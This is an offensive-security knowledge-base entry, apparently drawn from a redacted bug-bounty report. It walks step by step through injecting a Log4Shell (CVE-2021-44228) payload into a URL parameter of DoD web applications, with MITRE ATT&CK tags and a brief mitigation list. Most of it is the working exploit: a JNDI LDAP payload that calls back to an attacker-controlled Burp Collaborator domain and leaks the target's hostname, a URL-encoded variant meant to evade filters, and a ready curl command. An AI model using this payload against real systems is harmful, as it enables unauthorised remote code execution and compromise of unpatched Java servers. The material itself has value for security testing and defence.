---
tags:
  - log4shell
  - rce
  - jndi
  - payload-injection
type: procedure
tools:
  - '[[tools/Burp-Collaborator]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-send-log4shell-payload]]'
verified: false
platforms:
  - Web
  - Java
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:23:50.087Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
id: 71188dac-c95b-4838-af5f-6da00de70316
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Inject-Log4Shell-Payload-into-URL-Parameter

## Summary

This procedure crafts and injects a Log4Shell (CVE-2021-44228) payload into a vulnerable URL parameter of a web application using Apache Log4j, triggering a malicious JNDI LDAP lookup for remote code execution confirmation.

## Description

In a Java-based web application logging user inputs via vulnerable Log4j versions (2.0-2.16.0), attackers inject payloads like ${jndi:ldap://attacker-domain/a} into parameters. When logged, Log4j performs a JNDI lookup to the attacker's LDAP server, potentially executing arbitrary code. This targets public-facing DoD domains with unsanitized inputs, leading to full RCE and risks like data exfiltration or system compromise. Prerequisites include access to the target URL and an attacker-controlled domain for callbacks.

## Requirements

1. Network access to the target web application (e.g., https://███████/██████)
2. Vulnerable Apache Log4j (pre-2.17.0) in the backend
3. Tool for sending HTTP requests (browser or curl)
4. Attacker domain setup (e.g., Burp Collaborator) for JNDI callback

## Defense

Defensive measures and detection strategies:

- Upgrade Log4j to 2.17.0+ or apply patches
- Sanitize and validate user inputs before logging
- Disable JNDI lookups in Log4j configuration (log4j2.formatMsgNoLookups=true)
- Monitor for anomalous DNS resolutions to external domains
- Use WAF rules to block JNDI payloads in requests

## Objectives

1. Inject payload to trigger JNDI LDAP lookup
2. Confirm exploitation via external callback
3. Demonstrate RCE potential on the server

## Instructions

### Step 1: Craft the Payload

**Context**: Encode the Log4Shell payload for URL injection to evade basic filters.

**Command** ([[commands/curl-send-log4shell-payload]]):

Use the payload ${jndi:ldap://x${hostName}.LOG45200SSRF.xxxxxx.burpcollaborator.net/a}, URL-encoded as %24%7bjndi%3aldap%3a%2f%2fx%24%7bhostName%7d.LOG45200SSRF.xxxxxx.burpcollaborator.net%2fa%7d.

> This payload causes the server to resolve the attacker's domain, including the target's hostname in the DNS query.

### Step 2: Inject into Target Parameter

**Context**: Append the encoded payload to the vulnerable parameter (██████) in the target URL.

**Command** ([[commands/curl-send-log4shell-payload]]):
```bash
curl "https://███████/██████=%24%7bjndi%3aldap%3a%2f%2fx%24%7bhostName%7d.LOG45200SSRF.xxxxxx.burpcollaborator.net%2fa%7d" -v
```

> Sends the request; observe HTTP response for success. The backend Log4j processes the parameter, initiating the lookup.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/curl-send-log4shell-payload]]

## Tools Used

- [[tools/Burp-Collaborator]]

## Tags

- [[log4shell]]
- [[rce]]
- [[jndi]]
